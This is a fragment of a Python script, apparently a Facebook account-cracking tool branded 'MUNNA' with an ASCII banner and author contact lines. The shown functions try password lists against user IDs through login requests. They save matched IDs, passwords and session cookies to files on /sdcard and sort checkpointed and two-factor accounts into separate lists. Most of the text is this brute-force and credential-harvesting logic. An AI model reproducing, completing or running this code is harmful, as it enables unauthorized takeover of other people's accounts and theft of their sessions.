...
logo=(f"""{WHITE}
 ...
 | |\/| | |  | | . ` | . ` | / /\ \  
 | |  | | |__| | |\  | |\  |/ ____ \ 
 |_|  |_|\____/|_| \_|_| \_/_/    \_\ {BLUE}X {RED}PATHANI {WHITE}

\t[×] Developed By MAHI Gull{EXTRA} (MUNNA)
{WHITE}[•] AUTHOR       : MUNNA-MONDOL
{WHITE}[•] STYLE         : MUNNA-MONDOL
{WHITE}[•] WhatsApp     :   016********
[•] FaceBook     :   MUNNA
[•] Version      :   {RED}1.9
{WHITE}[•] YouTube      :   MUNNA-MONDOL
...
def Aryan():
  ...
  try:
    httpCaht = get_response('https://raw.githubusercontent.com/MUNNA302/aproval/main/approval.txt')
...
def pak():
                ...
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python MUNNA.py')
#------
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MUNNA-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/MUNNA-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MUNNA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-MUNNA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MUNNA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MUNNA-CP.txt','a').write(ids+'|'+pas+'\n')
...
'Content-Length': '706'}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-MUNNA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/USMII-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MUNNA-3F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-MUNNA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MUNNA-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MUNNA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [MUNNA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MUNNA-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
